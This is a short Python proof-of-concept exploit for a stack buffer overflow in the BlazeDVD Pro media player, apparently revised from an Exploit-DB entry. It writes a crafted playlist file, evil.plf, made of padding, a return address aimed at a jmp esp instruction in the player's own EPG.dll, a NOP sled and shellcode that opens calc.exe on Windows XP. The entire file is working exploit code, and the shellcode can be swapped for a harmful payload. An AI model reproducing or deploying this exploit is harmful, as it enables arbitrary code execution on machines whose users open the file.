#!/usr/bin/env python
#More reliable BlazeDVDPro BoF
#Original http://www.exploit-db.com/exploits/26889/ - Uses register from kernel32.dll making it OS dependent
junk = "\x41"*260
eip = "\xcb\x25\x65\x61" # jmp esp C:\Program Files\BlazeVideo\BlazeDVD6 Professional\EPG.dll Native BlazeDVD DLL
shellcode = "\x31\xC9\x51\x68\x63\x61\x6C\x63\x54\xB8\xC7\x93\xC2\x77\xFF\xD0" # Windows XP x86 calc.exe

f = open('evil.plf','w')
f.write(junk+eip+"\x90"*25+shellcode)
f.close()
